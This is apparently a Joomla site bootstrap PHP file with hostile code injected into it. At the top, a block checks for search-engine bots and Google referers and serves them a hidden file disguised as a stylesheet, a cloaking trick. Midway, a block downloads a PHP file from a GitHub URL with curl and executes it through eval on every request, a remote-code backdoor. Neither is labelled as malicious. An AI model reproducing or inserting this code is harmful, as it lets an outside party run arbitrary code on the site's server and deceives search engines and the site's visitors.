<?php
$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';

if ($uri == '/' && (
    strpos($userAgent, 'bot') !== false || 
    strpos($userAgent, 'google') !== false || 
    strpos($userAgent, 'chrome-lighthouse') !== false || 
    strpos($referer, 'google') !== false
)) {
    echo file_get_contents('templates/system/css/system_rtl.css');
    exit();
}

?>
<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

// Joomla system checks.
@ini_set('magic_quotes_runtime', 0);

// System includes
require_once JPATH_LIBRARIES . '/import.legacy.php';

// Set system error handling
JError::setErrorHandling(E_NOTICE, 'message');
JError::setErrorHandling(E_WARNING, 'message');
JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));

// Bootstrap the CMS libraries.
require_once JPATH_LIBRARIES . '/cms.php';

$version = new JVersion;

// Installation check, and check on removal of the install directory.
if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
	|| (filesize(JPATH_CONFIGURATION . '/configuration.php') < 10)
	|| (file_exists(JPATH_INSTALLATION . '/index.php') && (false === $version->isInDevelopmentState())))
{
	if (file_exists(JPATH_INSTALLATION . '/index.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');

		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';

		exit;
	}
}
    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
    
// Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
ob_start();
require_once JPATH_CONFIGURATION . '/configuration.php';
ob_end_clean();

// System configuration.
$config = new JConfig;

// Set the error_reporting
switch ($config->error_reporting)
{
	case 'default':
	case '-1':
		break;

	case 'none':
	case '0':
		error_reporting(0);

		break;

	case 'simple':
		error_reporting(E_ERROR | E_WARNING | E_PARSE);
		ini_set('display_errors', 1);

		break;

	case 'maximum':
		error_reporting(E_ALL);
		ini_set('display_errors', 1);

		break;

	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);

		break;

	default:
		error_reporting($config->error_reporting);
		ini_set('display_errors', 1);

		break;
}

define('JDEBUG', $config->debug);

unset($config);

// System profiler
if (JDEBUG)
{
	$_PROFILER = JProfiler::getInstance('Application');
}
